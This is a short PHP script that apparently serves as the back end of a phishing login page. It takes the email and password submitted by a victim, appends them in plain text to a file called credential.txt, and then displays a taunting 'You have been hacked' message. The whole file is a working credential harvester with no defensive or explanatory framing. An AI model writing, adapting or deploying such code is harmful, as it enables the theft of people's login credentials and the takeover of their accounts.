<?php
$email = $_POST['email'];
$password = $_POST['password'];
$file = fopen('credential.txt','a');
fwrite($file,"username = ".$email."\n");
fwrite($file,"password = ".$password."\n");
fclose($file);
echo "<h1>You have been hacked hyy bro hahahahahah...</h1>"
?>
